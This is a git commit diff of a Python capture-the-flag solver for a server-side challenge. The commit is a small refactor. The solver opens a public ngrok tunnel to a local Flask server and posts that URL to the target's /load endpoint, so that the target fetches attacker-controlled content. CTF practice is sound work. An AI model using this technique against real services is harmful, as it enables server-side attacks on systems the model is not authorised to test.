2e37cd096cabfec4f9fe82d58534e19f0113ccd7
SAW <99191294+nicsaw@users.noreply.github.com>
2025-03-30 05:22:08 +1100

    style

--- ctf/3-Server-Side/quoccedin.py
+++ ctf/3-Server-Side/quoccedin.py
@@ -21,14 +21,14 @@ def index():
 class Solver:
     def __init__(self):
         self.session = get_session()
-        self.ngrok_public_url = ngrok.connect(LISTEN_PORT, "http").public_url
 
     def start_server(self):
         threading.Thread(target=lambda: app.run(host="0.0.0.0", port=LISTEN_PORT), daemon=True).start()
 
     def main(self):
         self.start_server()
-        self.session.post(f"{BASE_URL}/load", json={"site": self.ngrok_public_url})
+        ngrok_public_url = ngrok.connect(LISTEN_PORT, "http").public_url
+        self.session.post(f"{BASE_URL}/load", json={"site": ngrok_public_url})
 
 if __name__ == "__main__":
     Solver().main()
